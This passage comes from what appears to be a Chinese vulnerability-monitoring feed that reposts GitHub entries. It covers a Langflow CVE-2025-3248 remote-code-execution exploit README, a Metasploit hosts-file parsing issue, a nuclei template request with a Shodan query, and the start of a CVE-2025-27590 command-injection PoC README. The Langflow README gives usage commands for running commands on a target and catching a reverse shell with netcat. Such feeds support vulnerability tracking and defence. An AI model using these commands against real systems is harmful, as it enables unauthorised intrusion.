    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Langflow 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-3248</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 此Python脚本利用CVE-2025-3248漏洞在易受攻击的系统上执行任意命令或生成反向shell。使用此漏洞需要认证。</p><p><strong>产品名称：</strong> Langflow</p><p><strong>来源：</strong> <a href="https://github.com/tiemio/RCE-CVE-2025-3248">https://github.com/tiemio/RCE-CVE-2025-3248</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Authenticated CVE-2025-3248 Langflow Remote Code Execution</span><br><br><span class="hljs-string">This</span> <span class="hljs-string">Python</span> <span class="hljs-string">script</span> <span class="hljs-string">exploits</span> <span class="hljs-string">**CVE-2025-3248**</span> <span class="hljs-string">to</span> <span class="hljs-string">execute</span> <span class="hljs-string">arbitrary</span> <span class="hljs-string">commands</span> <span class="hljs-string">or</span> <span class="hljs-string">spawn</span> <span class="hljs-string">a</span> <span class="hljs-string">reverse</span> <span class="hljs-string">shell</span> <span class="hljs-string">on</span> <span class="hljs-string">a</span> <span class="hljs-string">vulnerable</span> <span class="hljs-string">system.</span><br><span class="hljs-string">**Authentication</span> <span class="hljs-string">is</span> <span class="hljs-string">required**</span> <span class="hljs-string">to</span> <span class="hljs-string">use</span> <span class="hljs-string">this</span> <span class="hljs-string">exploit.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Features</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">**Authenticated</span> <span class="hljs-string">Command</span> <span class="hljs-string">Execution:**</span> <span class="hljs-string">Run</span> <span class="hljs-string">arbitrary</span> <span class="hljs-string">system</span> <span class="hljs-string">commands</span> <span class="hljs-string">on</span> <span class="hljs-string">the</span> <span class="hljs-string">target.</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">**Reverse</span> <span class="hljs-string">Shell:**</span> <span class="hljs-string">Spawn</span> <span class="hljs-string">a</span> <span class="hljs-string">reverse</span> <span class="hljs-string">shell</span> <span class="hljs-string">to</span> <span class="hljs-string">your</span> <span class="hljs-string">listener.</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">**Proxy</span> <span class="hljs-string">Support:**</span> <span class="hljs-string">Route</span> <span class="hljs-string">requests</span> <span class="hljs-string">through</span> <span class="hljs-string">a</span> <span class="hljs-string">proxy</span> <span class="hljs-string">(e.g.,</span> <span class="hljs-string">Burp</span> <span class="hljs-string">Suite).</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Requirements</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-string">Python</span> <span class="hljs-number">3.</span><span class="hljs-string">x</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">`requests`</span> <span class="hljs-string">library</span><br><br><span class="hljs-attr">Install dependencies with:</span><br><br><span class="hljs-string">bash</span><br><span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">requests</span><br><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Usage</span><br><br><span class="hljs-string">bash</span><br><span class="hljs-string">python3</span> <span class="hljs-string">exploit.py</span> <span class="hljs-string">-u</span> <span class="hljs-string">&lt;TARGET_URL&gt;</span> <span class="hljs-string">-l</span> <span class="hljs-string">&lt;USERNAME&gt;</span> <span class="hljs-string">-p</span> <span class="hljs-string">&lt;PASSWORD&gt;</span> [<span class="hljs-string">-c</span> <span class="hljs-string">&lt;COMMAND&gt;</span>] [<span class="hljs-string">--proxy</span> <span class="hljs-string">&lt;PROXY&gt;</span>] [<span class="hljs-string">--lhost</span> <span class="hljs-string">&lt;LHOST&gt;</span> <span class="hljs-string">--lport</span> <span class="hljs-string">&lt;LPORT&gt;</span>]<br><br><br><span class="hljs-comment">### Arguments</span><br><br><span class="hljs-string">|</span> <span class="hljs-string">Argument</span>         <span class="hljs-string">|</span> <span class="hljs-string">Description</span>                                      <span class="hljs-string">|</span> <span class="hljs-string">Required</span> <span class="hljs-string">|</span><br><span class="hljs-string">|------------------|--------------------------------------------------|----------|</span><br><span class="hljs-string">|</span> <span class="hljs-string">`-u`,</span> <span class="hljs-string">`--url`</span>    <span class="hljs-string">|</span> <span class="hljs-string">Target</span> <span class="hljs-string">base</span> <span class="hljs-string">URL</span> <span class="hljs-string">(e.g.,</span> <span class="hljs-string">`https://target.com`)</span>     <span class="hljs-string">|</span> <span class="hljs-literal">Yes</span>      <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">`-l`,</span> <span class="hljs-string">`--login`</span>  <span class="hljs-string">|</span> <span class="hljs-string">Admin</span> <span class="hljs-string">username</span>                                   <span class="hljs-string">|</span> <span class="hljs-literal">Yes</span>      <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">`-p`,</span> <span class="hljs-string">`--password`</span> <span class="hljs-string">|</span> <span class="hljs-string">Admin</span> <span class="hljs-string">password</span>                                 <span class="hljs-string">|</span> <span class="hljs-literal">Yes</span>      <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">`-c`,</span> <span class="hljs-string">`--command`|</span> <span class="hljs-string">Command</span> <span class="hljs-string">to</span> <span class="hljs-string">execute</span> <span class="hljs-string">on</span> <span class="hljs-string">the</span> <span class="hljs-string">target</span>                 <span class="hljs-string">|</span> <span class="hljs-literal">No</span><span class="hljs-string">*</span>      <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">`--proxy`</span>        <span class="hljs-string">|</span> <span class="hljs-string">Proxy</span> <span class="hljs-string">URL</span> <span class="hljs-string">(e.g.,</span> <span class="hljs-string">`http://127.0.0.1:8080`)</span>        <span class="hljs-string">|</span> <span class="hljs-literal">No</span>       <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">`--lhost`</span>        <span class="hljs-string">|</span> <span class="hljs-string">Local</span> <span class="hljs-string">host</span> <span class="hljs-string">for</span> <span class="hljs-string">reverse</span> <span class="hljs-string">shell</span>                     <span class="hljs-string">|</span> <span class="hljs-literal">No</span><span class="hljs-string">*</span>      <span class="hljs-string">|</span><br><span class="hljs-string">|</span> <span class="hljs-string">`--lport`</span>        <span class="hljs-string">|</span> <span class="hljs-string">Local</span> <span class="hljs-string">port</span> <span class="hljs-string">for</span> <span class="hljs-string">reverse</span> <span class="hljs-string">shell</span>                     <span class="hljs-string">|</span> <span class="hljs-literal">No</span><span class="hljs-string">*</span>      <span class="hljs-string">|</span><br><br><span class="hljs-string">\*</span> <span class="hljs-string">You</span> <span class="hljs-string">must</span> <span class="hljs-string">specify</span> <span class="hljs-string">either</span> <span class="hljs-string">a</span> <span class="hljs-string">command</span> <span class="hljs-string">(`-c`)</span> <span class="hljs-string">or</span> <span class="hljs-string">both</span> <span class="hljs-string">`--lhost`</span> <span class="hljs-string">and</span> <span class="hljs-string">`--lport`</span> <span class="hljs-string">for</span> <span class="hljs-string">a</span> <span class="hljs-string">reverse</span> <span class="hljs-string">shell.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">### Examples</span><br><br><span class="hljs-comment">#### 1. Execute a Command</span><br><br><span class="hljs-string">bash</span><br><span class="hljs-string">python3</span> <span class="hljs-string">exploit.py</span> <span class="hljs-string">-u</span> <span class="hljs-string">https://target.com</span> <span class="hljs-string">-l</span> <span class="hljs-string">admin</span> <span class="hljs-string">-p</span> <span class="hljs-string">password</span> <span class="hljs-string">-c</span> <span class="hljs-string">&quot;id&quot;</span><br><br><br><span class="hljs-comment">#### 2. Get a Reverse Shell</span><br><br><span class="hljs-attr">Start a listener on your machine:</span><br><br><span class="hljs-string">bash</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-lvnp</span> <span class="hljs-number">4444</span><br><br><br><span class="hljs-attr">Then run:</span><br><br><span class="hljs-string">bash</span><br><span class="hljs-string">python3</span> <span class="hljs-string">exploit.py</span> <span class="hljs-string">-u</span> <span class="hljs-string">https://target.com</span> <span class="hljs-string">-l</span> <span class="hljs-string">admin</span> <span class="hljs-string">-p</span> <span class="hljs-string">password</span> <span class="hljs-string">--lhost</span> <span class="hljs-string">YOUR_IP</span> <span class="hljs-string">--lport</span> <span class="hljs-number">4444</span><br><br><br><span class="hljs-comment">#### 3. Use a Proxy</span><br><br><span class="hljs-string">bash</span><br><span class="hljs-string">python3</span> <span class="hljs-string">exploit.py</span> <span class="hljs-string">-u</span> <span class="hljs-string">https://target.com</span> <span class="hljs-string">-l</span> <span class="hljs-string">admin</span> <span class="hljs-string">-p</span> <span class="hljs-string">password</span> <span class="hljs-string">-c</span> <span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-string">--proxy</span> <span class="hljs-string">http://127.0.0.1:8080</span><br><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Docker image</span><br><br><span class="hljs-comment">### Deploying the image</span><br><br><span class="hljs-attr">You can deploy the Docker image using the following command:</span><br><br><span class="hljs-string">bash</span><br><span class="hljs-string">podman</span> <span class="hljs-string">compose</span> <span class="hljs-string">up</span> <span class="hljs-string">-d</span><br><br><br><span class="hljs-string">The</span> <span class="hljs-string">image</span> <span class="hljs-string">will</span> <span class="hljs-string">be</span> <span class="hljs-string">available</span> <span class="hljs-string">at</span> <span class="hljs-string">`http://localhost:7860`.</span><br><span class="hljs-attr">Credits for the compose file:</span> [<span class="hljs-string">This</span> <span class="hljs-string">repository</span>]<span class="hljs-string">(https://github.com/vulhub/vulhub/tree/master/langflow/CVE-2025-3248)</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## Disclaimer</span><br><br><span class="hljs-string">This</span> <span class="hljs-string">script</span> <span class="hljs-string">is</span> <span class="hljs-string">for</span> <span class="hljs-string">**educational</span> <span class="hljs-string">and</span> <span class="hljs-string">authorized</span> <span class="hljs-string">penetration</span> <span class="hljs-string">testing**</span> <span class="hljs-string">purposes</span> <span class="hljs-string">only.</span><br><span class="hljs-string">**Do</span> <span class="hljs-string">not</span> <span class="hljs-string">use</span> <span class="hljs-string">against</span> <span class="hljs-string">systems</span> <span class="hljs-string">you</span> <span class="hljs-string">do</span> <span class="hljs-string">not</span> <span class="hljs-string">own</span> <span class="hljs-string">or</span> <span class="hljs-string">have</span> <span class="hljs-string">explicit</span> <span class="hljs-string">permission</span> <span class="hljs-string">to</span> <span class="hljs-string">test.**</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-string">This</span> <span class="hljs-string">readme</span> <span class="hljs-string">is</span> <span class="hljs-string">AI</span> <span class="hljs-string">generated.</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">- .gitignore- README.md- docker- exploit.py```</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Langflow 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-3248&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="CVE-2025-3248" scheme="http://example.com/tags/CVE-2025-3248/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit remove_host module Whitespace Parsing Vulnerability</title>
    <link href="http://example.com/2025/06/01/github_3373261989/"/>
    <id>http://example.com/2025/06/01/github_3373261989/</id>
    <published>2025-06-01T13:16:18.308Z</published>
    <updated>2025-06-01T13:16:18.305Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Metasploit remove_host module Whitespace Parsing Vulnerability</p><p><strong>漏洞类型：</strong> 配置问题</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Metasploit Framework中的<code>post/windows/manage/remove_host</code>模块在处理主机文件记录时，错误地假设所有记录都使用制表符(<code>\t</code>)来分隔主机和IP地址。实际上，空格(<code>0x20</code>)等多种空白字符也可以作为分隔符。此外，模块未考虑记录后可能存在的内联注释(<code>#</code>)或尾随空白，这导致模块无法正确处理某些格式的主机记录。此问题可能导致模块错误地移除或未能移除特定的主机记录。</p><p><strong>产品厂商：</strong> Rapid7</p><p><strong>产品名称：</strong> Metasploit Framework</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20157">https://github.com/rapid7/metasploit-framework/issues/20157</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">The `post/windows/manage/remove_host` <span class="hljs-keyword">module</span> presumes that all records <span class="hljs-keyword">in</span> the host file use tab (`\t`) <span class="hljs-keyword">to</span> separate the host <span class="hljs-keyword">and</span> IP address.<br><br>https:<span class="hljs-comment">//github.com/rapid7/metasploit-framework/blob/b5129fe19874e74d5a103bb9d1372fb30f618b32/modules/post/windows/manage/remove_host.rb#L61-L65</span><br><br>This <span class="hljs-keyword">is</span> an <span class="hljs-keyword">unsafe</span> assumption, <span class="hljs-keyword">as</span> space (`<span class="hljs-number">0</span>x20`) (<span class="hljs-keyword">and</span> likely many other forms <span class="hljs-keyword">of</span> whitespace) can be used <span class="hljs-keyword">as</span> a separator. The <span class="hljs-keyword">default</span> sample `hosts` file <span class="hljs-keyword">on</span> Windows offers the following guidance:<br><br><br># This file contains the mappings <span class="hljs-keyword">of</span> IP addresses <span class="hljs-keyword">to</span> host names. <span class="hljs-keyword">Each</span><br># entry should be kept <span class="hljs-keyword">on</span> an individual line. The IP address should<br># be placed <span class="hljs-keyword">in</span> the first column followed <span class="hljs-keyword">by</span> the corresponding host name.<br># The IP address <span class="hljs-keyword">and</span> the host name should be separated <span class="hljs-keyword">by</span> at least one<br># space.<br><br><br>Furthermore, host records can be followed <span class="hljs-keyword">by</span> an <span class="hljs-keyword">inline</span> comment (`#`) <span class="hljs-keyword">or</span> trailing whitespace, which the <span class="hljs-keyword">module</span> fails <span class="hljs-keyword">to</span> <span class="hljs-keyword">take</span> <span class="hljs-keyword">into</span> account <span class="hljs-keyword">as</span> the `$` <span class="hljs-keyword">end</span>-<span class="hljs-keyword">of</span>-line regex symbol <span class="hljs-keyword">is</span> used.<br><br><span class="hljs-keyword">As</span> a <span class="hljs-keyword">result</span>, this <span class="hljs-keyword">module</span> will fail <span class="hljs-keyword">to</span> <span class="hljs-keyword">remove</span> host records such <span class="hljs-keyword">as</span> the following:<br><br><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>asdf   <br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> asdf<br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> asdf # comment<br><br><br><span class="hljs-keyword">Finally</span>, <span class="hljs-keyword">as</span> the <span class="hljs-keyword">module</span> <span class="hljs-keyword">uses</span> regex <span class="hljs-keyword">matching</span>, the <span class="hljs-keyword">module</span> may incorrectly <span class="hljs-keyword">remove</span> hosts (although unlikely) <span class="hljs-keyword">if</span> the specified `DOMAIN` contains an unfortunately placed regex wildcard character (`.`). <span class="hljs-keyword">For</span> example, `<span class="hljs-keyword">set</span> DOMAIN shop.ebay.com` will <span class="hljs-keyword">remove</span> host records such <span class="hljs-keyword">as</span> `shop4ebay.com` -  a completely different domain (I can<span class="hljs-string">&#x27;t think of a better example).</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Metasploit remove_host module Whitespace Parsing Vulnerability&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 配置问题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="配置问题" scheme="http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft .NET Framework 远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/01/github_1314524899/"/>
    <id>http://example.com/2025/06/01/github_1314524899/</id>
    <published>2025-06-01T13:16:04.542Z</published>
    <updated>2025-06-01T13:16:04.536Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Microsoft .NET Framework 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-0646</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Microsoft .NET Framework 存在一个由于输入验证不当导致的远程代码执行漏洞，允许远程攻击者通过向系统发送恶意输入来执行任意代码。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> .NET Framework</p><p><strong>搜索语法：</strong> server: ms .net remoting</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12210">https://github.com/projectdiscovery/nuclei-templates/issues/12210</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><br><span class="hljs-comment">### Description: </span><br><span class="hljs-comment">&gt; Microsoft .NET Framework contains a remote code execution caused by improper input validation, letting remote attackers execute arbitrary code, exploit requires sending malicious input to the system.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">###</span><span class="hljs-comment"># Severity: `Critical`</span><br><br><span class="hljs-comment">#### POC: </span><br><span class="hljs-comment">- http://packetstormsecurity.com/files/156930/SharePoint-Workflows-XOML-Injection.html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">###</span> KEV: True<br><br><span class="hljs-comment">### Shodan Query: `server: ms .net remoting`</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Microsoft .NET Framework 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2020-0646&lt;/</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2020-0646" scheme="http://example.com/tags/CVE-2020-0646/"/>
    
  </entry>
  
  <entry>
    <title>Grafana 未授权访问漏洞</title>
    <link href="http://example.com/2025/06/01/github_1376329874/"/>
    <id>http://example.com/2025/06/01/github_1376329874/</id>
    <published>2025-06-01T13:15:54.208Z</published>
    <updated>2025-06-01T13:15:54.204Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Grafana 未授权访问漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-9264</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞描述：</strong> 一个影响Grafana版本11.0.x、11.1.x和11.2.x的未授权访问漏洞的Go语言实现。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>影响版本：</strong> 11.0.x, 11.1.x, 11.2.x</p><p><strong>来源：</strong> <a href="https://github.com/Cythonic1/CVE-2024-9264">https://github.com/Cythonic1/CVE-2024-9264</a></p><p><strong>类型：</strong> CVE-2024:github search</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scheme">```<br><br><br><br></code></pre></td></tr></table></figure><ul><li>go.mod- main.go&#96;&#96;&#96;</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Grafana 未授权访问漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2024-9264&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;stro</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
    <category term="CVE-2024-9264" scheme="http://example.com/tags/CVE-2024-9264/"/>
    
    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>Web Applications Command Injection via Multipart Form Upload Vulnerability</title>
    <link href="http://example.com/2025/06/01/github_3089224116/"/>
    <id>http://example.com/2025/06/01/github_3089224116/</id>
    <published>2025-06-01T13:15:41.393Z</published>
    <updated>2025-06-01T13:15:41.392Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Web Applications Command Injection via Multipart Form Upload Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-27590</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-27590是一个命令注入漏洞，影响处理多部分文件上传的Web应用程序。攻击者通过构造恶意的form-data载荷，可以在没有适当清理的情况下执行任意shell命令，包括SSH密钥注入。漏洞类型为命令执行，攻击向量为HTTP <code>multipart/form-data</code>，影响的参数为<code>cloginrc</code>和<code>file1</code>表单部分。</p><p><strong>产品名称：</strong> Web Applications Processing Multipart File Uploads</p><p><strong>来源：</strong> <a href="https://github.com/fatkz/CVE-2025-27590">https://github.com/fatkz/CVE-2025-27590</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># CVE-2025-27590 - PoC Exploit (Command Injection via Multipart Form Upload)</span><br><br><span class="hljs-comment">## 📌 Description</span><br><br><span class="hljs-string">This</span> <span class="hljs-string">is</span> <span class="hljs-string">a</span> <span class="hljs-string">Proof-of-Concept</span> <span class="hljs-string">(PoC)</span> <span class="hljs-string">exploit</span> <span class="hljs-string">for</span> <span class="hljs-string">**CVE-2025-27590**,</span> <span class="hljs-string">a</span> <span class="hljs-string">command</span> <span class="hljs-string">injection</span> <span class="hljs-string">vulnerability</span> <span class="hljs-string">affecting</span> <span class="hljs-string">web</span> <span class="hljs-string">applications</span> <span class="hljs-string">that</span> <span class="hljs-string">process</span> <span class="hljs-string">multipart</span> <span class="hljs-string">file</span> <span class="hljs-string">uploads</span> <span class="hljs-string">without</span> <span class="hljs-string">proper</span> <span class="hljs-string">sanitization.</span> <span class="hljs-string">The</span> <span class="hljs-string">vulnerability</span> <span class="hljs-string">allows</span> <span class="hljs-string">remote</span> <span class="hljs-string">attackers</span> <span class="hljs-string">to</span> <span class="hljs-string">execute</span> <span class="hljs-string">arbitrary</span> <span class="hljs-string">shell</span> <span class="hljs-string">commands</span> <span class="hljs-string">by</span> <span class="hljs-string">crafting</span> <span class="hljs-string">malicious</span> <span class="hljs-string">form-data</span> <span class="hljs-string">payloads.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## 🧠 Vulnerability Summary</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-attr">**Type**:</span> <span class="hljs-string">Command</span> <span class="hljs-string">Injection</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">**Vector**:</span> <span class="hljs-string">HTTP</span> <span class="hljs-string">`multipart/form-data`</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">**Affected Parameter**:</span> <span class="hljs-string">`cloginrc`</span> <span class="hljs-string">and</span> <span class="hljs-string">`file1`</span> <span class="hljs-string">form</span> <span class="hljs-string">parts</span><br><span class="hljs-bullet">-</span> <span 